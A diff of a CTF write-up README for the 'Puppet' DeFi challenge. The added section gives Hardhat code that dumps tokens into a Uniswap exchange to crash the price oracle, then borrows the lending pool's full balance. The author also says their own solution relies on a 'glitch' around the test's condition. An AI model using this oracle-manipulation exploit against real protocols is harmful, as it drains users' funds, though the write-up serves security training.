@@ -26,9 +26,33 @@ command to run test -> npx hardhat test puppet.challenge.js About to use github 
 
 I was unable to write report, because I dont have any clue how to write a good report.
 
-Also a condition is given stating that you have to do it in one transaction, Which is not possible.
-
 ** DO NOT READ FURTHER BELOW IF YOU HAVE NOT ALREADY TRIED SOLVING ** - highly recommended.
+
+## Must know before solve :
+
+in puppet.challenge.js there is a condition to be satisfied after the hack, which is not valid and not possible here in the solution to my code you will see I just did a glitch which is not really bipassing the conditon any ways you could also solve it as below :
+
+```javascript
+it("Execution", async function () {
+  await token
+    .connect(player)
+    .approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+  const data = await uniswapExchange
+    .connect(player)
+    .tokenToEthSwapInput(
+      PLAYER_INITIAL_TOKEN_BALANCE,
+      1,
+      (await ethers.provider.getBlock("latest")).timestamp * 2
+    );
+
+  const tx = await lendingPool
+    .connect(player)
+    .borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
+      value: ethers.utils.parseEther("20"),
+    });
+});
+```
 
 ## Solution :
 
